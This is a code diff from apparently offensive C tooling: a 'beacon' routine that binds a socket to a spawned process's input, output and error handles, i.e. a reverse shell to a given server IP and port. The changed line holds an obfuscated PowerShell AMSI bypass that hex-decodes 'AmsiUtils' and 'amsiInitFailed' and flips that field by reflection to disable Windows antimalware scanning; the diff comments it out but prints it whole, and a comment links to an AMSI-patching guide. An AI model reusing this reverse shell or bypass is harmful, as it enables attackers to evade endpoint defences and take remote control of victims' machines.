@@ -124,7 +124,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
         sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
         sinfo.hStdInput = (HANDLE)s;
         sinfo.hStdOutput = (HANDLE)s;
-        sinfo.argument = "[Ref].Assembly.GetType('System.Management.Automation.'+$(\"41 6D 73 69 55 74 69 6C 73\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(\"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)"
+        //sinfo.argument = "[Ref].Assembly.GetType('System.Management.Automation.'+$(\"41 6D 73 69 55 74 69 6C 73\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(\"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)"
         sinfo.hStdError = (HANDLE)s;
         PROCESS_INFORMATION pinfo;
         //Patch AMSI https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
